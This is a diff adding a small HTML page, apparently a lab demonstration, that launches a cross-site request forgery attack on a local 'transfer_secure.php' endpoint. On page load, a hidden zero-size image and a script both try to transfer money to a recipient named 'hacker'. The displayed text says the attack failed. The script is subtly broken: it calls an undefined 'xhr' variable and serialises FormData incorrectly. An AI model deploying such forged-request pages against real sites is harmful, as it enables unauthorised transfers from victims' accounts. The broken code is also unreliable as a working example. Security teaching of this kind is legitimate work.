@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width" />
+        <title>Image</title>
+        <script>
+            function send_request() {
+                var x = new XMLHttpRequest();
+                var formData = new FormData();
+                formData.append("recipient", "hacker");
+                formData.append("amount", 10000);
+
+                x.open(
+                    "POST",
+                    "http://localhost:8080/transfer_secure.php",
+                    true
+                );
+                x.setRequestHeader("Content-Type", "multipart/form-data");
+                xhr.send(JSON.stringify(formData));
+            }
+        </script>
+    </head>
+    <body onload="send_request()">
+        <center>
+            <h1>Ooops!</h1>
+            <p>I failed as a hacker</p>
+            <img
+                src="http://localhost:8080/transfer_secure.php?recipient=hacker&amount=1000"
+                width="0"
+                height="0"
+                border="0"
+            />
+        </center>
+    </body>
+</html>
